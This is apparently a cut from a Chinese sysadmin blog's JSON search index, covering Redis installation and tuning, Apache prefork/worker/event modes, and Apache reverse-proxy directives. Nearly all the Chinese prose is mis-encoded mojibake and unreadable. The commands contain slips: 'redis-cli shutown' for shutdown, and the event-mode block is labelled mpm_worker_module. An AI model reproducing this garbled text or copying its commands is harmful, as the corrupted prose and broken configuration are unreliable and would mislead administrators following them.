redis-serverï¼šRedisæœåŠ¡å™¨çš„daemonå¯åŠ¨ç¨‹åº redis-cliï¼šRediså‘½ä»¤è¡Œæ“ä½œå·¥å…·ã€‚ä¹Ÿå¯ä»¥ç”¨telnetæ ¹æ®å…¶çº¯æ–‡æœ¬åè®®æ¥æ“ä½œ redis-benchmarkï¼šRedisæ€§èƒ½æµ‹è¯•å·¥å…·ï¼Œæµ‹è¯•Redisåœ¨å½“å‰ç³»ç»Ÿä¸‹çš„è¯»å†™æ€§èƒ½ redis-check-aofï¼šæ•°æ®ä¿®å¤ redis-check-dumpï¼šæ£€æŸ¥å¯¼å‡ºå·¥å…· ä¿®æ”¹ç¯å¢ƒå˜é‡ vim /etc/profile export PATH=$PATH:/usr/local/redis/bin ","date":"2019-10-07 12:02","objectID":"/post/976/:0:2","tags":["redis"],"title":"rediså®‰è£…å’ŒåŸºç¡€è°ƒä¼˜","uri":"/post/976/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"äºŒã€é…ç½®åŸºç¡€å‚æ•°è°ƒä¼˜ 1.ä¿®æ”¹å†…æ ¸å‚æ•° echo vm.overcommit_memory=1 \u003e\u003e /etc/sysctl.conf sysctl -p å‚æ•°å«ä¹‰ï¼š 0ï¼Œè¡¨ç¤ºå†…æ ¸å°†æ£€æŸ¥æ˜¯å¦æœ‰è¶³å¤Ÿçš„å¯ç”¨å†…å­˜ä¾›åº”ç”¨è¿›ç¨‹ä½¿ç”¨ï¼›å¦‚æœæœ‰è¶³å¤Ÿçš„å¯ç”¨å†…å­˜ï¼Œå†…å­˜ç”³è¯·å…è®¸ï¼›å¦åˆ™ï¼Œå†…å­˜ç”³è¯·å¤±è´¥ï¼Œå¹¶æŠŠé”™è¯¯è¿”å›ç»™åº”ç”¨è¿›ç¨‹ã€‚ 1ï¼Œè¡¨ç¤ºå†…æ ¸å…è®¸åˆ†é…æ‰€æœ‰çš„ç‰©ç†å†…å­˜ï¼Œè€Œä¸ç®¡å½“å‰çš„å†…å­˜æ˜¯å¦è¶³å¤Ÿã€‚ 2ï¼Œè¡¨ç¤ºå†…æ ¸ä½¿ç”¨\"never overcommit\"ç­–ç•¥æ¥å°è¯•é˜²æ­¢ä»»ä½•å†…å­˜è¿‡åº¦ä½¿ç”¨ echoÂ net.core.somaxconn=2048 \u003e\u003e /etc/sysctl.conf sysctl -p ä¿®æ”¹TCPè¿æ¥é˜Ÿåˆ—é•¿åº¦ä¸º2048ï¼Œé…ç½®æ–‡ä»¶ä¸­tcp-backlog 2.ä¿®æ”¹é…ç½®æ–‡ä»¶ vim /usr/local/redis/etc/redis.conf #ç»‘å®šIPï¼Œåªèƒ½é€šè¿‡æ­¤IPè¿æ¥ bind 10.0.0.237 #æ¬¡å€¼ä¸èƒ½å¤§äºsomaxconnçš„å€¼ tcp-backlog 2048 #å¼€å¯å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼ daemonize yes #æŒ‡å®šæ—¥å¿—è¾“å‡ºæ–‡ä»¶ï¼Œé»˜è®¤åœ¨å±å¹•è¾“å‡º logfile \"/usr/local/redis/log/access.log\" #å…³é—­ä¿æŠ¤(ä¸å»ºè®®) #protected-mode no #è®¾ç½®å¯†ç ï¼ˆä¸å»ºè®®ï¼‰ #requirepass 123 åˆ›å»ºç”¨æˆ·æˆæƒuseradd -r redis \u0026\u0026 chown -R redis.redis /usr/local/redis/ ä½¿ç”¨redisç”¨æˆ·å¯åŠ¨redis su redis -s /bin/bash -c \"/usr/local/redis/bin/redis-serverÂ /usr/local/redis/etc/redis.conf\" åœæ­¢æˆ–è€… /usr/local/redis/bin/redis-cli shutown æœ‰å¯†ç åœæ­¢ /usr/local/redis/bin/redis-cli -a password shutown ä½¿ç”¨kill kill -QUIT pid ","date":"2019-10-07 12:02","objectID":"/post/976/:0:3","tags":["redis"],"title":"rediså®‰è£…å’ŒåŸºç¡€è°ƒä¼˜","uri":"/post/976/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"ä½¿ç”¨systemdç®¡ç† redis-server vim /etc/systemd/system/redis.service [Unit] Description=Redis persistent key-value database After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-server /usr/local/redis/etc/redis.conf --supervised systemd Type=notify User=redis Group=redis [Install] WantedBy=multi-user.target redis-sentinel vim /etc/systemd/system/redis-sentinel.service [Unit] Description=Redis Sentinel After=network.target After=network-online.target Wants=network-online.target [Service] ExecStart=/usr/local/redis/bin/redis-sentinel /usr/local/redis/etc/sentinel.conf --supervised systemd Type=notify #User=redis #Group=redis [Install] WantedBy=multi-user.target ","date":"2019-10-07 12:02","objectID":"/post/976/:0:4","tags":["redis"],"title":"rediså®‰è£…å’ŒåŸºç¡€è°ƒä¼˜","uri":"/post/976/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"prefork Â  å…³é”®å­—ï¼šå¤šè¿›ç¨‹ preforkæ¨¡å¼å¯ä»¥ç®—æ˜¯å¾ˆå¤è€ä½†æ˜¯éå¸¸ç¨³å®šçš„æ¨¡å¼ã€‚Apacheåœ¨å¯åŠ¨ä¹‹åˆï¼Œå°±é¢„æ´¾ç”Ÿ forkä¸€äº›å­è¿›ç¨‹ï¼Œç„¶åç­‰å¾…è¯·æ±‚è¿›æ¥ï¼Œå¹¶ä¸”æ€»æ˜¯è§†å›¾ä¿æŒä¸€äº›å¤‡ç”¨çš„å­è¿›ç¨‹ã€‚ä¹‹æ‰€ä»¥è¿™æ ·åšï¼Œæ˜¯ä¸ºäº†å‡å°‘é¢‘ç¹åˆ›å»ºå’Œé”€æ¯è¿›ç¨‹çš„å¼€é”€ã€‚æ¯ä¸ªå­è¿›ç¨‹ä¸­åªæœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œåœ¨ä¸€ä¸ªæ—¶é—´ç‚¹å†…ï¼Œåªèƒ½å¤„ç†ä¸€ä¸ªè¯·æ±‚ã€‚ åœ¨Unixç³»ç»Ÿä¸­ï¼Œçˆ¶è¿›ç¨‹é€šå¸¸ä»¥rootèº«ä»½è¿è¡Œä»¥ä¾¿é‚¦å®š80ç«¯å£ï¼Œè€Œ Apacheäº§ç”Ÿçš„å­è¿›ç¨‹é€šå¸¸ä»¥ä¸€ä¸ªä½ç‰¹æƒçš„ç”¨æˆ·è¿è¡Œã€‚Userå’ŒGroupæŒ‡ä»¤ç”¨äºé…ç½®å­è¿›ç¨‹çš„ä½ç‰¹æƒç”¨æˆ·ã€‚è¿è¡Œå­è¿›ç¨‹çš„ç”¨æˆ·å¿…é¡»è¦å¯¹ä»–æ‰€æœåŠ¡çš„å†…å®¹æœ‰è¯»å–çš„æƒé™ï¼Œä½†æ˜¯å¯¹æœåŠ¡å†…å®¹ä¹‹å¤–çš„å…¶ä»–èµ„æºå¿…é¡»æ‹¥æœ‰å°½å¯èƒ½å°‘çš„æƒé™ã€‚ ä¼˜ç‚¹ï¼šæˆç†Ÿï¼Œå…¼å®¹æ‰€æœ‰æ–°è€æ¨¡å—ã€‚è¿›ç¨‹ä¹‹é—´å®Œå…¨ç‹¬ç«‹ï¼Œä½¿å¾—å®ƒéå¸¸ç¨³å®šã€‚åŒæ—¶ï¼Œä¸éœ€è¦æ‹…å¿ƒçº¿ç¨‹å®‰å…¨çš„é—®é¢˜ã€‚ï¼ˆæˆ‘ä»¬å¸¸ç”¨çš„mod_phpï¼ŒPHPçš„æ‹“å±•ä¸éœ€è¦æ”¯æŒçº¿ç¨‹å®‰å…¨ï¼‰ ç¼ºç‚¹ï¼šä¸€ä¸ªè¿›ç¨‹ç›¸å¯¹å ç”¨æ›´å¤šçš„ç³»ç»Ÿèµ„æºï¼Œæ¶ˆè€—æ›´å¤šçš„å†…å­˜ã€‚è€Œä¸”ï¼Œå®ƒå¹¶ä¸æ“…é•¿å¤„ç†é«˜å¹¶å‘è¯·æ±‚ï¼Œåœ¨è¿™ç§åœºæ™¯ä¸‹ï¼Œå®ƒä¼šå°†è¯·æ±‚æ”¾è¿›é˜Ÿåˆ—ä¸­ï¼Œä¸€ç›´ç­‰åˆ°æœ‰å¯ç”¨è¿›ç¨‹ï¼Œè¯·æ±‚æ‰ä¼šè¢«å¤„ç†ã€‚ httpd-mpm.conf ä¸­çš„ç›¸å…³é…ç½®ï¼š \u003cIfModule mpm_prefork_module\u003e #æœåŠ¡å™¨å¯åŠ¨æ—¶å»ºç«‹çš„å­è¿›ç¨‹æ•°é‡ StartServers 5 #ç©ºé—²å­è¿›ç¨‹çš„æœ€å°æ•°é‡ï¼Œé»˜è®¤5ï¼›å¦‚æœå½“å‰ç©ºé—²å­è¿›ç¨‹æ•°å°‘äºMinSpareServers ï¼Œé‚£ä¹ˆApacheå°†ä¼šäº§ç”Ÿæ–°çš„å­è¿›ç¨‹ã€‚æ­¤å‚æ•°ä¸è¦è®¾çš„å¤ªå¤§ã€‚ MinSpareServers 5 #ç©ºé—²å­è¿›ç¨‹çš„æœ€å¤§æ•°é‡ï¼Œé»˜è®¤10ï¼›å¦‚æœå½“å‰æœ‰è¶…è¿‡MaxSpareServersæ•°é‡çš„ç©ºé—²å­è¿›ç¨‹ï¼Œé‚£ä¹ˆçˆ¶è¿›ç¨‹ä¼šæ€æ­»å¤šä½™çš„å­è¿›ç¨‹ã€‚æ­¤å‚æ•°ä¹Ÿä¸éœ€è¦è®¾ç½®å¤ªå¤§ï¼Œå¦‚æœä½ å°†å…¶è®¾ç½®æ¯” MinSpareServers å°ï¼ŒApacheä¼šè‡ªåŠ¨å°†å…¶ä¿®æ”¹ä¸ºMinSpareServers+1ã€‚ MaxSpareServers 10 #é™å®šæœåŠ¡å™¨åŒä¸€æ—¶é—´å†…å®¢æˆ·ç«¯æœ€å¤§æ¥å…¥çš„è¯·æ±‚æ•°é‡ï¼Œé»˜è®¤æ˜¯150ï¼›ä»»ä½•è¶…è¿‡äº†è¯¥é™åˆ¶çš„è¯·æ±‚éƒ½è¦è¿›å…¥ç­‰å¾…é˜Ÿåˆ—ï¼Œä¸€æ—¦ä¸€ä¸ªä¸ªè¿æ¥è¢«é‡Šæ”¾ï¼Œé˜Ÿåˆ—ä¸­çš„è¯·æ±‚æ‰å°†å¾—åˆ°æœåŠ¡ã€‚ MaxClients 150 #æ¯ä¸ªå­è¿›ç¨‹åœ¨å…¶ç”Ÿå‘½å‘¨æœŸå†…å…è®¸æœ€å¤§çš„è¯·æ±‚æ•°é‡ï¼Œå¦‚æœè¯·æ±‚æ€»æ•°å·²ç»è¾¾åˆ°è¿™ä¸ªæ•°å€¼ï¼Œå­è¿›ç¨‹å°†ä¼šç»“æŸï¼Œå¦‚æœè®¾ç½®ä¸º0ï¼Œå­è¿›ç¨‹å°†æ°¸è¿œä¸ä¼šç»“æŸã€‚è‹¥è¯¥å€¼è®¾ç½®ä¸ºé0å€¼ï¼Œå¯ä»¥é˜²æ­¢è¿è¡ŒPHPå¯¼è‡´çš„å†…å­˜æ³„éœ²ã€‚ MaxRequestsPerChild 0 \u003c/IfModule\u003e åˆ›å»ºçš„è¿›ç¨‹æ•°ï¼Œæœ€å¤šè¾¾åˆ°æ¯ç§’32ä¸ªï¼Œç›´åˆ°æ»¡è¶³MinSpareServersè®¾ç½®çš„å€¼ä¸ºæ­¢ã€‚è¿™å°±æ˜¯é¢„æ´¾ç”Ÿï¼ˆpreforkï¼‰çš„ç”±æ¥ã€‚è¿™ç§æ¨¡å¼å¯ä»¥ä¸å¿…åœ¨è¯·æ±‚åˆ°æ¥æ—¶å†äº§ç”Ÿæ–°çš„è¿›ç¨‹ï¼Œä»è€Œå‡å°äº†ç³»ç»Ÿå¼€é”€ä»¥å¢åŠ æ€§èƒ½ã€‚ å¹¶å‘é‡è¯·æ±‚æ•°åˆ°è¾¾MaxClientsï¼ˆå¦‚256ï¼‰æ—¶ï¼Œè€Œç©ºé—²è¿›ç¨‹åªæœ‰10ä¸ªã€‚apacheä¸ºç»§ç»­å¢åŠ åˆ›å»ºè¿›ç¨‹ã€‚ç›´åˆ°è¿›ç¨‹æ•°åˆ°è¾¾256ä¸ªã€‚ å½“å¹¶å‘é‡é«˜å³°æœŸè¿‡å»äº†ï¼Œå¹¶å‘è¯·æ±‚æ•°å¯èƒ½åªæœ‰ä¸€ä¸ªæ—¶ï¼Œapacheé€æ¸åˆ é™¤è¿›ç¨‹ï¼Œç›´åˆ°è¿›ç¨‹æ•°åˆ°è¾¾MaxSpareServersä¸ºæ­¢ã€‚ work Â  å…³é”®å­—ï¼šå¤šè¿›ç¨‹+å¤šçº¿ç¨‹ workeræ¨¡å¼æ¯”èµ·ä¸Šä¸€ä¸ªï¼Œæ˜¯ä½¿ç”¨äº†å¤šè¿›ç¨‹+å¤šçº¿ç¨‹çš„æ¨¡å¼ã€‚å®ƒä¹Ÿé¢„å…ˆforkäº†å‡ ä¸ªå­è¿›ç¨‹ï¼ˆæ•°é‡æ¯”è¾ƒå°‘ï¼‰ï¼Œæ¯ä¸ªå­è¿›ç¨‹èƒ½å¤Ÿç”Ÿæˆä¸€äº›æœåŠ¡çº¿ç¨‹å’Œä¸€ä¸ªç›‘å¬çº¿ç¨‹ï¼Œè¯¥ç›‘å¬çº¿ç¨‹ç›‘å¬æ¥å…¥è¯·æ±‚å¹¶å°†å…¶ä¼ é€’ç»™æœåŠ¡çº¿ç¨‹å¤„ç†å’Œåº”ç­”ã€‚ Apacheæ€»æ˜¯è¯•å›¾ç»´æŒä¸€ä¸ªå¤‡ç”¨(spare)æˆ–æ˜¯ç©ºé—²çš„æœåŠ¡çº¿ç¨‹æ± ã€‚è¿™æ ·ï¼Œå®¢æˆ·ç«¯æ— é¡»ç­‰å¾…æ–°çº¿ç¨‹æˆ–æ–°è¿›ç¨‹çš„å»ºç«‹å³å¯å¾—åˆ°å¤„ç†ã€‚åœ¨Unixä¸­ï¼Œä¸ºäº†èƒ½å¤Ÿç»‘å®š80ç«¯å£ï¼Œçˆ¶è¿›ç¨‹ä¸€èˆ¬éƒ½æ˜¯ä»¥rootèº«ä»½å¯åŠ¨ï¼Œéšåï¼ŒApacheä»¥è¾ƒä½æƒé™çš„ç”¨æˆ·å»ºç«‹å­è¿›ç¨‹å’Œçº¿ç¨‹ã€‚Userå’ŒGroupæŒ‡ä»¤ç”¨äºé…ç½®Apacheå­è¿›ç¨‹çš„æƒé™ã€‚è™½ç„¶å­è¿›ç¨‹å¿…é¡»å¯¹å…¶æä¾›çš„å†…å®¹æ‹¥æœ‰è¯»æƒé™ï¼Œä½†åº”è¯¥å°½å¯èƒ½ç»™äºˆä»–è¾ƒå°‘çš„ç‰¹æƒã€‚å¦å¤–ï¼Œé™¤éä½¿ç”¨äº†suexec ï¼Œå¦åˆ™ï¼Œè¿™äº›æŒ‡ä»¤é…ç½®çš„æƒé™å°†è¢«CGIè„šæœ¬æ‰€ç»§æ‰¿ã€‚ çº¿ç¨‹æ¯”èµ·è¿›ç¨‹ä¼šæ›´è½»é‡ï¼Œå› ä¸ºçº¿ç¨‹é€šå¸¸ä¼šå…±äº«çˆ¶è¿›ç¨‹çš„å†…å­˜ç©ºé—´ï¼Œå› æ­¤ï¼Œå†…å­˜çš„å ç”¨ä¼šå‡å°‘ä¸€äº›ï¼Œåœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸‹ï¼Œè¡¨ç°å¾—æ¯” preforkæ¨¡å¼å¥½ã€‚ æœ‰äº›äººä¼šè§‰å¾—å¥‡æ€ªï¼Œé‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆä¸ç›´æ¥ä½¿ç”¨å¤šçº¿ç¨‹å‘¢ï¼ˆå³åœ¨ä¸€ä¸ªè¿›ç¨‹å†…å®ç°å¤šè¿›ç¨‹ï¼‰ï¼Œè¿˜è¦å¼•å…¥å¤šè¿›ç¨‹ï¼Ÿ åŸå› ä¸»è¦æ˜¯éœ€è¦è€ƒè™‘ç¨³å®šæ€§ï¼Œå¦‚æœä¸€ä¸ªçº¿ç¨‹å¼‚å¸¸æŒ‚äº†ï¼Œä¼šå¯¼è‡´çˆ¶è¿›ç¨‹è¿åŒå…¶ä»–æ­£å¸¸çš„å­çº¿ç¨‹éƒ½æŒ‚äº†ï¼ˆå®ƒä»¬éƒ½æ˜¯åŒä¸€ä¸ªè¿›ç¨‹ä¸‹çš„ï¼‰ã€‚å¤šè¿›ç¨‹+å¤šçº¿ç¨‹æ¨¡å¼ä¸­ï¼Œå„ä¸ªè¿›ç¨‹ä¹‹é—´éƒ½æ˜¯ç‹¬ç«‹çš„ï¼Œå¦‚æœæŸä¸ªçº¿ç¨‹å‡ºç°å¼‚å¸¸ï¼Œå—å½±å“çš„åªæ˜¯Apacheçš„ä¸€éƒ¨åˆ†æœåŠ¡ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæœåŠ¡ã€‚å…¶ä»–è¿›ç¨‹ä»ç„¶å¯ä»¥å·¥ä½œã€‚ ä¼˜ç‚¹ï¼šå æ®æ›´å°‘çš„å†…å­˜ï¼Œé«˜å¹¶å‘ä¸‹è¡¨ç°æ›´ä¼˜ç§€ã€‚ ç¼ºç‚¹ï¼šå¿…é¡»è€ƒè™‘çº¿ç¨‹å®‰å…¨çš„é—®é¢˜ï¼Œå› ä¸ºå¤šä¸ªå­çº¿ç¨‹æ˜¯å…±äº«çˆ¶è¿›ç¨‹çš„å†…å­˜åœ°å€çš„ã€‚å¦‚æœä½¿ç”¨keep-aliveçš„é•¿è¿æ¥æ–¹å¼ï¼Œä¹Ÿè®¸ä¸­é—´å‡ ä¹æ²¡æœ‰è¯·æ±‚ï¼Œè¿™æ—¶å°±ä¼šå‘ç”Ÿé˜»å¡ï¼Œçº¿ç¨‹è¢«æŒ‚èµ·ï¼Œéœ€è¦ä¸€ç›´ç­‰å¾…åˆ°è¶…æ—¶æ‰ä¼šè¢«é‡Šæ”¾ã€‚å¦‚æœè¿‡å¤šçš„çº¿ç¨‹ï¼Œè¢«è¿™æ ·å æ®ï¼Œä¹Ÿä¼šå¯¼è‡´åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹çš„æ— æœåŠ¡çº¿ç¨‹å¯ç”¨ã€‚ï¼ˆè¯¥é—®é¢˜åœ¨preforkæ¨¡å¼ä¸‹ï¼ŒåŒæ ·ä¼šå‘ç”Ÿï¼‰ Psï¼šhttp1.1çš„keep-aliveçš„é•¿è¿æ¥æ–¹å¼ï¼Œæ˜¯ä¸ºäº†è®©ä¸‹ä¸€æ¬¡çš„socketé€šä¿¡å¤ç”¨ä¹‹å‰åˆ›å»ºçš„è¿æ¥ï¼Œä»è€Œï¼Œå‡å°‘è¿æ¥çš„åˆ›å»ºå’Œé”€æ¯çš„ç³»ç»Ÿå¼€é”€ã€‚ä¿æŒè¿æ¥ï¼Œä¼šè®©æŸä¸ªè¿›ç¨‹æˆ–è€…çº¿ç¨‹ä¸€ç›´å¤„äºç­‰å¾…çŠ¶æ€ï¼Œå³ä½¿æ²¡æœ‰æ•°æ®è¿‡æ¥ã€‚ \u003cIfModule mpm_worker_module\u003e #æœåŠ¡å™¨å¯åŠ¨æ—¶å»ºç«‹çš„å­è¿›ç¨‹æ•°é‡ StartServers 2 #é™å®šæœåŠ¡å™¨åŒä¸€æ—¶é—´å†…å®¢æˆ·ç«¯æœ€å¤§æ¥å…¥çš„è¯·æ±‚æ•°é‡ï¼Œé»˜è®¤æ˜¯150ï¼›ä»»ä½•è¶…è¿‡äº†è¯¥é™åˆ¶çš„è¯·æ±‚éƒ½è¦è¿›å…¥ç­‰å¾…é˜Ÿåˆ—ï¼Œä¸€æ—¦ä¸€ä¸ªä¸ªè¿æ¥è¢«é‡Šæ”¾ï¼Œé˜Ÿåˆ—ä¸­çš„è¯·æ±‚æ‰å°†å¾—åˆ°æœåŠ¡ã€‚ MaxClients 150 #ç©ºé—²å­è¿›ç¨‹çš„æœ€å°æ•°é‡ MinSpareThreads 25 #ç©ºé—²å­è¿›ç¨‹çš„æœ€å¤§æ•°é‡ MaxSpareThreads 75 #æ¯ä¸ªå­è¿›ç¨‹äº§ç”Ÿçš„çº¿ç¨‹æ•°é‡ ThreadsPerChild 25 #æ¯ä¸ªå­è¿›ç¨‹åœ¨å…¶ç”Ÿå‘½å‘¨æœŸå†…å…è®¸æœ€å¤§çš„è¯·æ±‚æ•°é‡ï¼Œå¦‚æœè¯·æ±‚æ€»æ•°å·²ç»è¾¾åˆ°è¿™ä¸ªæ•°å€¼ï¼Œå­è¿›ç¨‹å°†ä¼šç»“æŸï¼Œå¦‚æœè®¾ç½®ä¸º0ï¼Œå­è¿›ç¨‹å°†æ°¸è¿œä¸ä¼šç»“æŸã€‚å°†è¯¥å€¼è®¾ç½®ä¸ºé0å€¼ï¼Œå¯ä»¥é˜²æ­¢è¿è¡ŒPHPå¯¼è‡´çš„å†…å­˜æ³„éœ²ã€‚ MaxRequestsPerChild 0 \u003c/IfModule\u003e Â  ç†è§£é…ç½®ï¼šç”±ä¸»æ§åˆ¶è¿›ç¨‹ç”Ÿæˆâ€œStartServersâ€ä¸ªå­è¿›ç¨‹ï¼Œæ¯ä¸ªå­è¿›ç¨‹ä¸­åŒ…å«å›ºå®šçš„ThreadsPerChildçº¿ç¨‹æ•°ï¼Œå„ä¸ªçº¿ç¨‹ç‹¬ç«‹åœ°å¤„ç†è¯·æ±‚ã€‚åŒæ ·ï¼Œä¸ºäº†å°½é‡é¿å…åœ¨è¯·æ±‚åˆ°æ¥æ‰ç”Ÿæˆçº¿ç¨‹ï¼ŒMinSpareThreadså’ŒMaxSpareThreadsè®¾ç½®äº†æœ€å°‘å’Œæœ€å¤šçš„ç©ºé—²çº¿ç¨‹æ•°ï¼›è€ŒMaxClientsè®¾ç½®äº†æ‰€æœ‰å­è¿›ç¨‹ä¸­çš„çº¿ç¨‹æ€»æ•°ã€‚å¦‚æœç°æœ‰å­è¿›ç¨‹ä¸­çš„çº¿ç¨‹æ€»æ•°ä¸èƒ½æ»¡è¶³è´Ÿè½½ï¼Œæ§åˆ¶è¿›ç¨‹å°†æ´¾ç”Ÿæ–°çš„å­è¿›ç¨‹ã€‚ event Â  å…³é”®å­—ï¼šå¤šè¿›ç¨‹+å¤šçº¿ç¨‹+epoll è¿™ä¸ªæ˜¯ Apacheä¸­æœ€æ–°çš„æ¨¡å¼ï¼Œåœ¨ç°åœ¨ç‰ˆæœ¬é‡Œçš„å·²ç»æ˜¯ç¨³å®šå¯ç”¨çš„æ¨¡å¼ã€‚å®ƒå’Œ workeræ¨¡å¼å¾ˆåƒï¼Œæœ€å¤§çš„åŒºåˆ«åœ¨äºï¼Œå®ƒè§£å†³äº† keep-alive åœºæ™¯ä¸‹ ï¼Œé•¿æœŸè¢«å ç”¨çš„çº¿ç¨‹çš„èµ„æºæµªè´¹é—®é¢˜ï¼ˆæŸäº›çº¿ç¨‹å› ä¸ºè¢«keep-aliveï¼ŒæŒ‚åœ¨é‚£é‡Œç­‰å¾…ï¼Œä¸­é—´å‡ ä¹æ²¡æœ‰è¯·æ±‚è¿‡æ¥ï¼Œä¸€ç›´ç­‰åˆ°è¶…æ—¶ï¼‰ã€‚ event MPMä¸­ï¼Œä¼šæœ‰ä¸€ä¸ªä¸“é—¨çš„çº¿ç¨‹æ¥ç®¡ç†è¿™äº› keep-alive ç±»å‹çš„çº¿ç¨‹ï¼Œå½“æœ‰çœŸå®è¯·æ±‚è¿‡æ¥çš„æ—¶å€™ï¼Œå°†è¯·æ±‚ä¼ é€’ç»™æœåŠ¡çº¿ç¨‹ï¼Œæ‰§è¡Œå®Œæ¯•åï¼Œåˆå…è®¸å®ƒé‡Šæ”¾ã€‚è¿™æ ·ï¼Œä¸€ä¸ªçº¿ç¨‹å°±èƒ½å¤„ç†å‡ ä¸ªè¯·æ±‚äº†ï¼Œå®ç°äº†å¼‚æ­¥éé˜»å¡ã€‚ event MPMåœ¨é‡åˆ°æŸäº›ä¸å…¼å®¹çš„æ¨¡å—æ—¶ï¼Œä¼šå¤±æ•ˆï¼Œå°†ä¼šå›é€€åˆ°workeræ¨¡å¼ï¼Œä¸€ä¸ªå·¥ä½œçº¿ç¨‹å¤„ç†ä¸€ä¸ªè¯·æ±‚ã€‚å®˜æ–¹è‡ªå¸¦çš„æ¨¡å—ï¼Œå…¨éƒ¨æ˜¯æ”¯æŒevent MPMçš„ã€‚ æ³¨æ„ä¸€ç‚¹ï¼Œevent MPMéœ€è¦Linuxç³»ç»Ÿï¼ˆLinux 2.6+ï¼‰å¯¹Epollçš„æ”¯æŒï¼Œæ‰èƒ½å¯ç”¨ã€‚ è¿˜æœ‰ï¼Œéœ€è¦è¡¥å……çš„æ˜¯HTTPSçš„è¿æ¥ï¼ˆSSLï¼‰ï¼Œå®ƒçš„è¿è¡Œæ¨¡å¼ä»ç„¶æ˜¯ç±»ä¼¼workerçš„æ–¹å¼ï¼Œçº¿ç¨‹ä¼šè¢«ä¸€ç›´å ç”¨ï¼ŒçŸ¥é“è¿æ¥å…³é—­ã€‚éƒ¨åˆ†æ¯” è¾ƒè€çš„èµ„æ–™é‡Œï¼Œè¯´event MPMä¸æ”¯æŒSSLï¼Œé‚£ä¸ªè¯´æ³•æ˜¯å‡ å¹´å‰çš„è¯´æ³•ï¼Œç°åœ¨å·²ç»æ”¯æŒäº†ã€‚ \u003cIfModule mpm_worker_module\u003e #æœåŠ¡å™¨å¯åŠ¨æ—¶å»ºç«‹çš„å­è¿›ç¨‹æ•°é‡ StartServers 3 #ç©ºé—²å­è¿›ç¨‹çš„æœ€å°æ•°é‡ MinSpareThreads 75 #ç©ºé—²å­è¿›ç¨‹çš„æœ€å°æ•°é‡ MaxSpareThreads 250 #æ¯ä¸ªå­è¿›ç¨‹äº§ç”Ÿçš„çº¿ç¨‹æ•°é‡ ThreadsPerChild 25 #é™å®šæœåŠ¡å™¨åŒä¸€æ—¶é—´å†…å®¢æˆ·ç«¯æœ€å¤§æ¥å…¥çš„è¯·æ±‚æ•°é‡ï¼Œé»˜è®¤æ˜¯150ï¼›ä»»ä½•è¶…è¿‡äº†è¯¥é™åˆ¶çš„è¯·æ±‚éƒ½è¦è¿›å…¥ç­‰å¾…é˜Ÿåˆ—ï¼Œä¸€æ—¦ä¸€ä¸ªä¸ªè¿æ¥è¢«é‡Šæ”¾ï¼Œé˜Ÿåˆ—ä¸­çš„è¯·æ±‚æ‰å°†å¾—åˆ°æœåŠ¡ã€‚ MaxRequestWorkers 400 #æ¯ä¸ªå­è¿›ç¨‹åœ¨å…¶ç”Ÿå‘½å‘¨æœŸå†…å…è®¸æœ€å¤§çš„è¯·æ±‚æ•°é‡ï¼Œå¦‚æœè¯·æ±‚æ€»æ•°å·²ç»è¾¾åˆ°è¿™ä¸ªæ•°å€¼ï¼Œå­è¿›ç¨‹å°†ä¼šç»“æŸï¼Œå¦‚æœè®¾ç½®ä¸º0ï¼Œå­è¿›ç¨‹å°†æ°¸è¿œä¸ä¼šç»“æŸã€‚å°†è¯¥å€¼è®¾ç½®ä¸ºé0å€¼ï¼Œå¯ä»¥é˜²æ­¢è¿è¡ŒPHPå¯¼è‡´çš„å†…å­˜æ³„éœ²ã€‚ MaxRequestsPerChild 0 \u003c/IfModule\u003e æœ¬æ–‡è½¬è‡ªï¼šhttp://blog.csdn.net/STFPHP/article/details/52954303Â ","date":"2019-09-23 17:17","objectID":"/post/949/:0:0","tags":["apache"],"title":"apacheä¸‰ç§å·¥ä½œæ¨¡å¼preforkã€workã€event","uri":"/post/949/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"Â å¼€å¯åå‘ä»£ç†æ¨¡å—ï¼š LoadModule proxy_module modules/mod_proxy.so LoadModule proxy_http_module modules/mod_proxy_http.so LoadModule proxy_balancer_module modules/mod_proxy_balancer.so LoadModule slotmem_shm_module modules/mod_slotmem_shm.so å¼€å¯è´Ÿè½½å‡è¡¡æ¨¡å—ï¼š LoadModule lbmethod_byrequests_module modules/mod_lbmethod_byrequests.so LoadModule lbmethod_bytraffic_module modules/mod_lbmethod_bytraffic.so LoadModule lbmethod_bybusyness_module modules/mod_lbmethod_bybusyness.so åå‘ä»£ç† Â  1.ProxyPassæŒ‡ä»¤ åœ¨åå‘ä»£ç†åˆ°åç«¯çš„urlåï¼Œpathæ˜¯ä¸ä¼šå¸¦è¿‡å»çš„ã€‚æ­¤æŒ‡ä»¤ä¸æ”¯æŒæ­£åˆ™ã€‚ å¯ä»¥ä½¿ç”¨åœ¨server config ï¼Œlocationï¼Œvirtualhostä¸­ä½¿ç”¨ ç”¨æ³•ï¼š ProxyPass [path]Â ! | url 2.ProxyPassReverseæŒ‡ä»¤ æ­¤æŒ‡ä»¤ä¸€èˆ¬å’ŒProxyPassæŒ‡ä»¤é…åˆä½¿ç”¨ã€‚ é€šè¿‡æ­¤æŒ‡ä»¤ï¼Œå¯ä»¥é¿å…Â åœ¨Apacheä½œä¸ºåå‘ ä»£ç†ä½¿ç”¨æ—¶ï¼Œåç«¯æœåŠ¡å™¨çš„HTTPé‡å®šå‘é€ æˆç»•è¿‡åå‘ä»£ç†çš„é—®é¢˜ã€‚ ç”¨æ³•ï¼š ProxyPassReverse [path]Â ! | url 3.ProxyPassMatchæŒ‡ä»¤ ç”¨æ³•åŒProxyPassï¼Œæ­¤æŒ‡ä»¤æ”¯æŒæ­£åˆ™ ProxyPass [path]Â ! | url ä¾‹å­ï¼š å…¨ç«™ä»£ç†ï¼š ProxyPass \"/\" \"http://www.test.com\" ProxyPassReverse \"/\" \"http://www.test.com\" 